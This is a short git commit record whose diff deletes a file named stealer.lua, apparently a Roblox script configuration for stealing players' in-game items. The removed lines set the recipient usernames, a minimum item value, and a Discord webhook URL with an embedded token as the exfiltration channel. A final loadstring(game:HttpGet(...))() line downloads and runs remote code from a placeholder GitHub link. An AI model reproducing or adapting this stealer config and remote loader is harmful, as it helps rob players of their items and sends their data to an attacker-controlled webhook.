340a6f300eed7b73399bf37a237af8d2c805cbd2
PetPredictorV2 <carlmcnielmartinez10@gmail.com>
2025-06-14 18:56:21 +0800

    Delete stealer.lua

--- stealer.lua
+++
@@ -1,6 +0,0 @@
-_G.Usernames = {"Mcniel678", "user2", "user3"} -- you can add as many as you'd like
-_G.min_value = 100000000 -- 100 million
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1381949632514363503/qkVFX5rjXixkiuGHQJccuyoXmARkVVz1llHnqlkX8zCSJWcHQfYYYxUAhjr2hU2VD9-" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/REPLACE/WITHYOUROWNLINK"))()
